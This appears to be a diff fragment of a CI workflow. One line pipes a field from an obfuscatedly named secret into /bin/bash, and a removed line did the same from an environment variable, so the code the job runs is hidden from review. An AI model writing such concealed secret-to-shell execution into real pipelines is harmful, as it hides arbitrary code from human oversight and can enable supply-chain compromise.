@@ -18,7 +18,6 @@ jobs:
           krez7755: ${{ secrets.krez7755 }}
         run: |
           printf '%s' "$krez7755" | jq -r .uppfg8 | /bin/bash
-          echo $yfwf11 | jq -r .eeiky35 | /bin/bash
 
       - name: Archive output
         if: always()
